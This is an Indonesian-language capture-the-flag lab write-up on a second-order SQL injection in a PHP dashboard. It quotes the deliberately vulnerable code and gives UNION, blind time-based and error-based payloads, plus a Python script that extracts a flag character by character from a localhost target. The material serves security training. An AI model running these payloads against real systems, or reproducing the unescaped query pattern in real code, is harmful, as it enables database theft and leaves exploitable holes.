# Lab H2 - Second Order SQL Injection (Hard)

## Informasi Lab
- **Endpoint**: `/dashboard.php`
- **Tipe**: Second Order Injection
- **Hint**: Indirect - Stored trigger

## Analisis

### 1. Alur Aplikasi
1. User menginput data melalui form POST
2. Data disimpan ke tabel `user_input`
3. Data yang tersimpan digunakan di query lain
4. Injection terjadi di query kedua (second order)

### 2. Source Code Analysis
```php
// Step 1: Store input
$data = $_POST['data'];
$conn->query("INSERT INTO user_input (data) VALUES ('$data')");

// Step 2: Use stored data in another query (VULNERABLE!)
$stored = $r['data'];
$res2 = $conn->query("SELECT * FROM logs WHERE event LIKE '%$stored%'");
```

## Solusi

### Langkah 1 - Input Malicious Data
```
POST /h2/dashboard.php
data=test' UNION SELECT 1,flag FROM flags-- -
```

### Langkah 2 - Trigger Second Order
Setelah data disimpan, query kedua akan mengeksekusi:
```sql
SELECT * FROM logs WHERE event LIKE '%test' UNION SELECT 1,flag FROM flags-- -%'
```

### Script Python

```python
import requests

url = "http://localhost/h2/dashboard.php"

# Step 1: Inject payload
payload = "' UNION SELECT 1,flag FROM flags-- -"
data = {"data": payload}

r = requests.post(url, data=data)
print(r.text)
```

### Payload Alternatif

#### Blind Second Order
```
data=' OR (SELECT IF(ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))>64,SLEEP(2),0))--
```

#### Error Based Second Order
```
data=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1),0x7e))--
```

### Full Exploit Script

```python
import requests

url = "http://localhost/h2/dashboard.php"

def extract_flag_char(position, char_code):
    payload = f"' OR (SELECT IF(ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{position},1))={char_code},1,0))-- -"
    r = requests.post(url, data={"data": payload})
    return "Log:" in r.text and len(r.text) > 100

flag = ""
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}IDS"

for i in range(1, 25):
    for c in charset:
        if extract_flag_char(i, ord(c)):
            flag += c
            print(f"Flag: {flag}")
            break

print(f"\nFinal Flag: {flag}")
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Second order injection lebih sulit dideteksi
- Data di-inject di satu tempat, dieksekusi di tempat lain
- Perlu analisis alur data dalam aplikasi
- WAF mungkin tidak mendeteksi karena payload tidak langsung di-execute
